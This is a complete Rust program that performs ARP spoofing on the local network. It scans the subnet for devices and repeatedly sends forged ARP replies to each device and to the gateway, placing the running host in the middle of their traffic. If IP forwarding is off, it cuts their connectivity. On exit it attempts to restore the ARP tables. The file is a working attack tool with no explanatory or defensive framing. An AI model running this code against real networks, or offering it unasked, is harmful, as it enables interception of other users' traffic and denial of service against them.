use std::collections::HashMap;
use std::fs;
use std::net::Ipv4Addr;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::{Duration, Instant};

use pnet::datalink::{self, Channel, Config, DataLinkReceiver, DataLinkSender, NetworkInterface};
use pnet::ipnetwork::IpNetwork;
use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, ArpPacket, MutableArpPacket};
use pnet::packet::ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket};
use pnet::packet::{MutablePacket, Packet};
use pnet::util::MacAddr;

const BROADCAST_MAC: MacAddr = MacAddr(0xff, 0xff, 0xff, 0xff, 0xff, 0xff);
const PACKET_SIZE: usize = 42;
const SPOOF_INTERVAL_MS: u64 = 2000;
const SCAN_INTERVAL_MS: u64 = 15_000;
const INITIAL_SCAN_WAIT_MS: u64 = 2000;
const BG_SCAN_WAIT_MS: u64 = 800;

fn has_cap_net_raw() -> bool {
    if unsafe { libc::geteuid() } == 0 {
        return true;
    }
    if let Ok(status) = fs::read_to_string("/proc/self/status") {
        for line in status.lines() {
            if let Some(caps) = line.strip_prefix("CapEff:\t") {
                if let Ok(mask) = u64::from_str_radix(caps.trim(), 16) {
                    return mask & (1 << 13) != 0;
                }
            }
        }
    }
    false
}

fn ip_forward_enabled() -> Option<bool> {
    fs::read_to_string("/proc/sys/net/ipv4/ip_forward")
        .ok()
        .map(|s| s.trim() == "1")
}

struct Shared {
    running: AtomicBool,
    targets: Mutex<HashMap<Ipv4Addr, MacAddr>>,
    scan_cycles: AtomicU64,
    spoof_packets: AtomicU64,
    start_time: Instant,
}

impl Shared {
    fn new() -> Self {
        Self {
            running: AtomicBool::new(true),
            targets: Mutex::new(HashMap::new()),
            scan_cycles: AtomicU64::new(0),
            spoof_packets: AtomicU64::new(0),
            start_time: Instant::now(),
        }
    }
}

#[derive(Clone)]
struct NetworkInfo {
    interface: NetworkInterface,
    local_ip: Ipv4Addr,
    local_mac: MacAddr,
    gateway_ip: Ipv4Addr,
    gateway_mac: MacAddr,
}

fn build_arp_request(buf: &mut [u8], src_mac: MacAddr, src_ip: Ipv4Addr, target_ip: Ipv4Addr) {
    let mut eth = MutableEthernetPacket::new(buf).unwrap();
    eth.set_destination(BROADCAST_MAC);
    eth.set_source(src_mac);
    eth.set_ethertype(EtherTypes::Arp);

    let mut arp = MutableArpPacket::new(eth.payload_mut()).unwrap();
    arp.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp.set_protocol_type(EtherTypes::Ipv4);
    arp.set_hw_addr_len(6);
    arp.set_proto_addr_len(4);
    arp.set_operation(ArpOperations::Request);
    arp.set_sender_hw_addr(src_mac);
    arp.set_sender_proto_addr(src_ip);
    arp.set_target_hw_addr(MacAddr::zero());
    arp.set_target_proto_addr(target_ip);
}

#[allow(clippy::too_many_arguments)]
fn build_arp_reply(
    buf: &mut [u8],
    eth_src: MacAddr,
    eth_dst: MacAddr,
    sender_mac: MacAddr,
    sender_ip: Ipv4Addr,
    target_mac: MacAddr,
    target_ip: Ipv4Addr,
) {
    let mut eth = MutableEthernetPacket::new(buf).unwrap();
    eth.set_destination(eth_dst);
    eth.set_source(eth_src);
    eth.set_ethertype(EtherTypes::Arp);

    let mut arp = MutableArpPacket::new(eth.payload_mut()).unwrap();
    arp.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp.set_protocol_type(EtherTypes::Ipv4);
    arp.set_hw_addr_len(6);
    arp.set_proto_addr_len(4);
    arp.set_operation(ArpOperations::Reply);
    arp.set_sender_hw_addr(sender_mac);
    arp.set_sender_proto_addr(sender_ip);
    arp.set_target_hw_addr(target_mac);
    arp.set_target_proto_addr(target_ip);
}

fn is_virtual_interface(name: &str) -> bool {
    name.starts_with("docker")
        || name.starts_with("veth")
        || name.starts_with("br-")
        || name.starts_with("virbr")
        || name.starts_with("vmnet")
        || name.starts_with("tun")
        || name.starts_with("tap")
        || name.starts_with("wg")
        || name.starts_with("zt")
        || name == "lo"
}

fn detect_network() -> Option<NetworkInfo> {
    let interfaces = datalink::interfaces();
    let iface = interfaces.into_iter().find(|i| {
        i.is_up()
            && !i.is_loopback()
            && !is_virtual_interface(&i.name)
            && i.ips.iter().any(|ip| matches!(ip, IpNetwork::V4(_)))
    })?;

    let local_ip = iface.ips.iter().find_map(|ip| match ip {
        IpNetwork::V4(v4) => Some(v4.ip()),
        _ => None,
    })?;
    let local_mac = iface.mac?;
    let gateway_ip = detect_gateway()?;

    Some(NetworkInfo {
        interface: iface,
        local_ip,
        local_mac,
        gateway_ip,
        gateway_mac: MacAddr::zero(),
    })
}

fn detect_gateway() -> Option<Ipv4Addr> {
    let content = fs::read_to_string("/proc/net/route").ok()?;
    for line in content.lines().skip(1) {
        let f: Vec<&str> = line.split_whitespace().collect();
        if f.len() < 3 {
            continue;
        }
        if f[1] == "00000000" {
            let gw_hex = u32::from_str_radix(f[2], 16).ok()?;
            let b = gw_hex.to_le_bytes();
            return Some(Ipv4Addr::new(b[0], b[1], b[2], b[3]));
        }
    }
    None
}

fn resolve_gateway_mac(
    tx: &mut Box<dyn DataLinkSender>,
    rx: &mut Box<dyn DataLinkReceiver>,
    local_mac: MacAddr,
    local_ip: Ipv4Addr,
    gateway_ip: Ipv4Addr,
) -> Option<MacAddr> {
    let mut buf = [0u8; PACKET_SIZE];
    build_arp_request(&mut buf, local_mac, local_ip, gateway_ip);
    tx.send_to(&buf, None)?.ok()?;

    let deadline = Instant::now() + Duration::from_secs(3);
    while Instant::now() < deadline {
        if let Ok(packet) = rx.next() {
            if let Some((ip, mac)) = extract_arp_reply(packet, local_mac) {
                if ip == gateway_ip {
                    return Some(mac);
                }
            }
        }
    }
    None
}

fn extract_arp_reply(packet: &[u8], our_mac: MacAddr) -> Option<(Ipv4Addr, MacAddr)> {
    let eth = EthernetPacket::new(packet)?;
    if eth.get_ethertype() != EtherTypes::Arp {
        return None;
    }
    if eth.get_source() == our_mac {
        return None;
    }
    let arp = ArpPacket::new(eth.payload())?;
    if arp.get_operation() != ArpOperations::Reply {
        return None;
    }
    if arp.get_hw_addr_len() != 6 || arp.get_proto_addr_len() != 4 {
        return None;
    }
    if eth.get_source() != arp.get_sender_hw_addr() {
        return None;
    }
    Some((arp.get_sender_proto_addr(), arp.get_sender_hw_addr()))
}

fn scan_full_subnet(tx: &Arc<Mutex<Box<dyn DataLinkSender>>>, net: &NetworkInfo, wait: Duration) {
    let [a, b, c, _] = net.gateway_ip.octets();
    let mut buf = [0u8; PACKET_SIZE];

    if let Ok(mut tx_lock) = tx.lock() {
        for i in 1u8..=254 {
            let target_ip = Ipv4Addr::new(a, b, c, i);
            if target_ip == net.local_ip || target_ip == net.gateway_ip {
                continue;
            }
            build_arp_request(&mut buf, net.local_mac, net.local_ip, target_ip);
            let _ = tx_lock.send_to(&buf, None);
        }
    }

    thread::sleep(wait);
}

fn spawn_reader(
    mut rx: Box<dyn DataLinkReceiver>,
    shared: Arc<Shared>,
    net: Arc<NetworkInfo>,
) -> thread::JoinHandle<()> {
    thread::spawn(move || {
        while shared.running.load(Ordering::SeqCst) {
            if let Ok(packet) = rx.next() {
                if let Some((ip, mac)) = extract_arp_reply(packet, net.local_mac) {
                    if ip == net.gateway_ip || ip == net.local_ip {
                        continue;
                    }
                    if let Ok(mut targets) = shared.targets.lock() {
                        targets.insert(ip, mac);
                    }
                }
            }
        }
    })
}

fn spawn_spoof_sender(
    tx: Arc<Mutex<Box<dyn DataLinkSender>>>,
    shared: Arc<Shared>,
    net: Arc<NetworkInfo>,
) -> thread::JoinHandle<()> {
    thread::spawn(move || {
        let mut buf = [0u8; PACKET_SIZE];
        let cycle_dur = Duration::from_millis(SPOOF_INTERVAL_MS);

        while shared.running.load(Ordering::SeqCst) {
            let cycle_start = Instant::now();

            let targets: Vec<(Ipv4Addr, MacAddr)> = match shared.targets.lock() {
                Ok(t) => t.iter().map(|(k, v)| (*k, *v)).collect(),
                Err(_) => continue,
            };

            if let Ok(mut t) = tx.lock() {
                let mut sent: u64 = 0;
                for (target_ip, target_mac) in &targets {
                    if !shared.running.load(Ordering::SeqCst) {
                        break;
                    }

                    build_arp_reply(
                        &mut buf,
                        net.local_mac,
                        *target_mac,
                        net.local_mac,
                        net.gateway_ip,
                        *target_mac,
                        *target_ip,
                    );
                    let _ = t.send_to(&buf, None);
                    sent += 1;

                    build_arp_reply(
                        &mut buf,
                        net.local_mac,
                        net.gateway_mac,
                        net.local_mac,
                        *target_ip,
                        net.gateway_mac,
                        net.gateway_ip,
                    );
                    let _ = t.send_to(&buf, None);
                    sent += 1;
                }
                shared.spoof_packets.fetch_add(sent, Ordering::Relaxed);
            }

            let elapsed = cycle_start.elapsed();
            if elapsed < cycle_dur {
                thread::sleep(cycle_dur - elapsed);
            }
        }
    })
}

fn spawn_background_scanner(
    tx: Arc<Mutex<Box<dyn DataLinkSender>>>,
    shared: Arc<Shared>,
    net: Arc<NetworkInfo>,
) -> thread::JoinHandle<()> {
    thread::spawn(move || {
        while shared.running.load(Ordering::SeqCst) {
            thread::sleep(Duration::from_millis(SCAN_INTERVAL_MS));
            if !shared.running.load(Ordering::SeqCst) {
                break;
            }
            scan_full_subnet(&tx, &net, Duration::from_millis(BG_SCAN_WAIT_MS));
            shared.scan_cycles.fetch_add(1, Ordering::SeqCst);
        }
    })
}

fn spawn_display(shared: Arc<Shared>, net: Arc<NetworkInfo>) -> thread::JoinHandle<()> {
    thread::spawn(move || {
        let anim = ["|", "/", "-", "\\"];
        let mut idx = 0usize;
        while shared.running.load(Ordering::SeqCst) {
            let targets = shared.targets.lock().map(|g| g.len()).unwrap_or(0);
            let cycles = shared.scan_cycles.load(Ordering::SeqCst);
            let packets = shared.spoof_packets.load(Ordering::Relaxed);
            let elapsed = shared.start_time.elapsed();
            let mins = elapsed.as_secs() / 60;
            let secs = elapsed.as_secs() % 60;
            let fwd = ip_forward_enabled();

            print!("\x1B[2J\x1B[H");
            println!("==================================================");
            println!("🚀 ARP SPOOF RUNNING");
            println!("==================================================");
            println!("🌐 Gateway:   {} ({})", net.gateway_ip, net.gateway_mac);
            println!("💻 Local IP:  {} ({})", net.local_ip, net.local_mac);
            println!("🔧 Interface:    {}", net.interface.name);
            match fwd {
                Some(true) => println!("⚠️  ip_forward: enabled (traffic forwarding is enabled)"),
                Some(false) => {
                    println!("✅ ip_forward: disabled (connectivity may be interrupted)")
                }
                None => println!("❔ ip_forward: unknown"),
            }
            println!("--------------------------------------------------");
            println!();
            println!("{} ARP spoofing is active...", anim[idx]);
            println!("📱 Discovered devices:    {}", targets);
            println!("📤 Packets attempted: {}", packets);
            println!("🔄 Background scan cycles:      {}", cycles);
            println!("⏱️  Elapsed time:       {:02}:{:02}", mins, secs);
            println!();
            println!("⏹️  Press Ctrl+C to stop");

            idx = (idx + 1) % anim.len();
            thread::sleep(Duration::from_millis(500));
        }
    })
}

fn restore_network(
    tx: &Arc<Mutex<Box<dyn DataLinkSender>>>,
    shared: &Arc<Shared>,
    net: &NetworkInfo,
) {
    println!("\n==================================================");
    println!("🛑 STOPPING APPLICATION");
    println!("==================================================");
    println!("🔧 Attempting to restore ARP mappings...");

    let targets: Vec<(Ipv4Addr, MacAddr)> = shared
        .targets
        .lock()
        .map(|g| g.iter().map(|(k, v)| (*k, *v)).collect())
        .unwrap_or_default();

    let mut buf = [0u8; PACKET_SIZE];
    for (target_ip, target_mac) in &targets {
        build_arp_reply(
            &mut buf,
            net.gateway_mac,
            *target_mac,
            net.gateway_mac,
            net.gateway_ip,
            *target_mac,
            *target_ip,
        );
        if let Ok(mut t) = tx.lock() {
            for _ in 0..5 {
                let _ = t.send_to(&buf, None);
            }
        }

        build_arp_reply(
            &mut buf,
            *target_mac,
            net.gateway_mac,
            *target_mac,
            *target_ip,
            net.gateway_mac,
            net.gateway_ip,
        );
        if let Ok(mut t) = tx.lock() {
            for _ in 0..5 {
                let _ = t.send_to(&buf, None);
            }
        }
    }

    println!(
        "✅ ARP restoration attempted for {} devices.",
        targets.len()
    );
}

fn print_welcome() {
    print!("\x1B[2J\x1B[H");
    println!("==================================================");
    println!("🚀 ARP SPOOF");
    println!("==================================================");
    println!("🔄 Starting application...");
    println!("⏳ Please wait");
    println!("==================================================");
    thread::sleep(Duration::from_millis(1200));
}

fn main() {
    if !has_cap_net_raw() {
        eprintln!("❌ Root privileges or CAP_NET_RAW are required!");
        eprintln!("   Run with sudo or grant the capability: sudo setcap cap_net_raw+ep ./target/release/arp_spoof");
        std::process::exit(1);
    }

    print_welcome();

    match ip_forward_enabled() {
        Some(true) => {
            println!("⚠️  NOTICE: ip_forward=1; IPv4 forwarding is enabled.");
            println!("   Forwarding is managed by the operating system; this application does not change it.");
            println!();
            thread::sleep(Duration::from_millis(2000));
        }
        Some(false) => println!("✅ ip_forward=0 (connectivity may be interrupted)\n"),
        None => {}
    }

    let mut net = match detect_network() {
        Some(n) => n,
        None => {
            eprintln!("❌ Could not detect network configuration!");
            return;
        }
    };

    let config = Config {
        read_timeout: Some(Duration::from_millis(100)),
        promiscuous: true,
        ..Default::default()
    };

    let (mut tx, mut rx) = match datalink::channel(&net.interface, config) {
        Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => {
            eprintln!("❌ Unsupported datalink channel type!");
            return;
        }
        Err(e) => {
            eprintln!("❌ Could not open datalink channel: {}", e);
            return;
        }
    };

    let gw_mac = match resolve_gateway_mac(
        &mut tx,
        &mut rx,
        net.local_mac,
        net.local_ip,
        net.gateway_ip,
    ) {
        Some(m) => m,
        None => {
            eprintln!("❌ Could not resolve the gateway MAC address!");
            return;
        }
    };
    net.gateway_mac = gw_mac;

    let net = Arc::new(net);
    let shared = Arc::new(Shared::new());
    let tx = Arc::new(Mutex::new(tx));

    {
        let shared = shared.clone();
        ctrlc::set_handler(move || {
            shared.running.store(false, Ordering::SeqCst);
        })
        .expect("Failed to register the Ctrl+C handler");
    }

    let reader_handle = spawn_reader(rx, shared.clone(), net.clone());
    let display_handle = spawn_display(shared.clone(), net.clone());

    scan_full_subnet(&tx, &net, Duration::from_millis(INITIAL_SCAN_WAIT_MS));
    let found = shared.targets.lock().map(|g| g.len()).unwrap_or(0);
    println!("✅ Initial scan complete: {} devices found", found);

    let sender_handle = spawn_spoof_sender(tx.clone(), shared.clone(), net.clone());
    let bg_handle = spawn_background_scanner(tx.clone(), shared.clone(), net.clone());

    while shared.running.load(Ordering::SeqCst) {
        thread::sleep(Duration::from_millis(200));
    }

    restore_network(&tx, &shared, &net);

    let _ = reader_handle.join();
    let _ = sender_handle.join();
    let _ = bg_handle.join();
    let _ = display_handle.join();

    println!("👋 Application exited");
    std::process::exit(0);
}
